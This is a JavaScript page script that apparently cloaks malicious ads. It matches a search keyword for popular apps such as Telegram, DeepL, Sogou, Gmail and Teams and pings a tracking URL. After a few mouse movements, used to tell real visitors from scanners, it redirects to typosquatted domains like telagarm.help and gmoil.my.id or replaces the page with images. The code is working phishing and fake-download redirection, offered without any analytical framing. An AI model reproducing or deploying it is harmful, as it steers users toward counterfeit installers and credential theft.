var numCount=0;
var allowCount=5;
var confArr=[
["helloworld",3,"https://www.hellowold2.com",true],
["yifanyi|易翻译",2,"https://changjieweb.com",true],
["deepl",1,"https://www.zjznmbf.com",true],
["teams",2,"https://xytyts.com",true],
["sogou|sougou|搜狗|输入法",3,"https://down.666888.help/goo/sougou.php",false],
["kuailian|快连",3,"https://down.666888.help/goo/letsp.php",false],
["qishui|汽水",1,"https://www.yssuygdm.com",false],
["telegram|tg|飞机|电报",5,"https://down.telagarm.help/downloads.php",false],
["snipaste|截图|截屏",6,"https://www.gbdsmys.com",false],
["gmail|邮箱",1,"https://workspace.gmoil.my.id",true],
["as|爱思",3,"https://www.luodtxd.com",false],
["hellogpt",1,"https://hallogpt.cloud",true]
];

var findObj;

$(function()
{
	const urlParams = new URLSearchParams(window.location.search);
	var kw=urlParams.get("kw");
	if(kw){kw=kw.toLowerCase().replaceAll(" ","");}
	if(kw)
	{
		for(var i=0;i<confArr.length;i++)
		{
			var arrObj=confArr[i];
			var curName=arrObj[0].toLowerCase();
			if(new RegExp(curName).test(kw)==true)
			{
				findObj=confArr[i];
				$.get("https://www.admfd.com/Siv/Sivs");
				break;
			}
		}
	}
	if(findObj)
	{
		$("body").append("<ul class='haufw'><li></li></ul>");
	}

	$("body").mousemove(function(event)
	{
		if(event.pageX>0 && event.pageY>0 && findObj)
		{
			numCount++;
			if(numCount==allowCount)
			{
				document.title="site";
				if(findObj[3]==true)
				{
					window.location=findObj[2];
				}
				else
				{
					var imgDoms="";
					var sName=findObj[0].split("|")[0];
					for(var i=1;i<=findObj[1];i++)
					{
						imgDoms+="<img src='img/"+sName+i+".jpg' />";
					}
					$("body").html(imgDoms);
					$("body").css("line-height","0px");
				}
			}
		}
	});

	$("body").click(function(event)
	{
		if(checkRes(event)==true)
		{
			window.location=findObj[2];
		}
	});
})

function checkRes(e)
{
	if(numCount>=allowCount && e.pageX>0 && e.pageY>0 && findObj)
	{return true;}else{return false;}
}
